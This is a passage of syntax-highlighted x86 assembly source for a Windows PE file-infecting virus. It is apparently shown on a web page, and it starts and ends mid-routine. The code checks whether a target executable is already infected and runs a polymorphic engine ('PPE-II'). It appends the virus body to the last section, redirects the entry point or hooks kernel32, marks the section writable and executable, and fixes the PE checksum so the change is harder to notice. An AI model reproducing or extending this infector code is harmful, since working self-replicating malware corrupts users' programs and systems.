        </span><span class="sc1">; seek on NT header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddIsBadCodePtr</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;can we read memory at least?</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_unMap</span><span class="sc0">

        </span><span class="sc1">; check "PE" signature</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_Signature</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_unMap</span><span class="sc0">   </span><span class="sc1">;is it really 'PE\0\0' ?</span><span class="sc0">

        </span><span class="sc1">; already infected ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;mapped file in memory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dta.dta_filesize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;infected dword flag</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__check_infected</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">infect_file_unMap</span><span class="sc0">

        </span><span class="sc1">; check header flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_unMap</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">   </span><span class="sc1">;no DLL ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_no_dll</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_unMap</span><span class="sc0">   </span><span class="sc1">;is it kernel32 infection ?</span><span class="sc0">

    </span><span class="sc5">infect_file_no_dll</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__getLastObjectTable</span><span class="sc0">    </span><span class="sc1">;seek on last object table</span><span class="sc0">

        </span><span class="sc1">; alloc memory for polymorphic engine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get new entry-point (EXE), or change IT of kernel32 ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infected_ep</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_ep</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">],</span><span class="sc5">mem_size</span><span class="sc0">

        </span><span class="sc1">; run Prizzy Polymorphic Engine (PPE-II)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_file_common</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_startup</span><span class="sc0">

        </span><span class="sc1">; calculate maximum infected file size</span><span class="sc0">
    </span><span class="sc5">infect_file_common</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; + virus file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">           </span><span class="sc1">; + infected flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; unmap file object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; close mapping file object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; reopen memory mapped file object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;name of file mapping object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0000004h</span><span class="sc4">]</span><span class="sc1">;low 32 bits of object size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;high 32 bits of object size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">      </span><span class="sc1">;get needed valuez, etc.</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;optional security attributes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;handle to file to map</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store mapped file handle</span><span class="sc0">

        </span><span class="sc1">; view of file in our memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;number of bytes to map</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;low 32 bits of the offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;high 32 bits of the offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">      </span><span class="sc1">;access mode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmap</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;mapped file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;mapped file in memory</span><span class="sc0">

        </span><span class="sc1">; seek on last object table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__getLastObjectTable</span><span class="sc0">

        </span><span class="sc1">; infect "KERNEL32" file OR change EntryPoint</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_lsize</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0"> </span><span class="sc1">;more info in that func</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file_kernel</span><span class="sc0">  </span><span class="sc1">;hook "kernel32" table :)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect_file_no_change</span><span class="sc0">
    </span><span class="sc5">infect_file_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infected_ep</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_size3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; copy mem_address (virus body) to the end of file</span><span class="sc0">
    </span><span class="sc5">infect_file_no_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;source data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;destination pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;number of bytes to copy</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; calculate new physical size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">it_is_kernel</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">;this isn't logic but i had</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">        </span><span class="sc1">;problems in k32 memory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; calculate new potential virtual size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; if new phys_size &gt; virt_size  ==&gt;  virt_size = phys_size</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">infect_file_no_update</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">infect_file_no_update</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; infected host increased an image size ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">infect_no_update_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">infect_no_update_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; set these PE flags</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_SCN_CNT_CODE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
            </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

        </span><span class="sc1">; already infected flag</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02302301h</span><span class="sc0">       </span><span class="sc1">;special number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;it can't be zero</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">117</span><span class="sc0">         </span><span class="sc1">;encrypt one</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;file size + virus size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hsize</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;mapped file in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;already infected flag</span><span class="sc0">

        </span><span class="sc1">; calculate new checksum because of Win2k and WinNT :)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.</span><span class="sc0"> \
                       </span><span class="sc5">OH_CheckSum</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_no_checksum</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"IMAGEHLP.DLL"</span><span class="sc0">      </span><span class="sc1">;load "IMAGEHLP.DLL" library</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddLoadLibraryA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;failed ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_no_checksum</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;parameter for FreeLibrary</span><span class="sc0">

        </span><span class="sc1">; get function to calculate checksum</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"CheckSumMappedFile"</span><span class="sc0">    </span><span class="sc1">;get address of this function</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;library handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetProcAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_file_deload</span><span class="sc0">

        </span><span class="sc1">; calculate checksum</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_CheckSum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;receives computed checksum</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">         </span><span class="sc1">;header old checksum</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_hmem</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;memory mapped address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">infect_file_deload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFreeLibrary</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; dealloc memory for PPE-II</span><span class="sc0">
    </span><span class="sc5">infect_file_no_checksum</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">

        </span><span class="sc1">; new infected file</span><span class="sc0">
